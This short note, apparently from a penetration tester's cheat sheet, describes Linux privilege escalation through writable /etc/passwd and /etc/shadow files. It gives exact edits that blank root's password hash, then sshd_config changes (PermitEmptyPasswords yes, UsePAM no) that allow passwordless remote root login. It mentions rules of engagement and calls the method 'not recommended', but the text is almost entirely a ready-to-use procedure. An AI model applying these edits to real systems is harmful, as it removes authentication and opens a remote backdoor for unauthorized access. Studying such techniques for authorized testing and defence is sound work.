If you have the ability to edit /etc/shadow and etc/passwd, you might be able to obtain root access without cracking. (Not recommended! Rules of Engagement may not allow. Cracking is useful because of password reuse.)

in /etc/passwd, remove the x after root
ie:
     root:x:0:0:root:/root:/bin/bash change to
     root::0:0:root:/root:/bin/bash

in /etc/shadow  remove everything between the colons
ie:
     root:<SOMEHASH>:<NUM>:0:<NUM>:<NUM>::: to
     root:::::::: (don't add or remove colons, just the stuff between them)

now, the root user has no password (or just log in if ssh allows), change the ssh config to allow remote login with no password

Edit two lines /etc/ssh/sshd_config:
PermitEmptyPasswords yes
UsePAM no
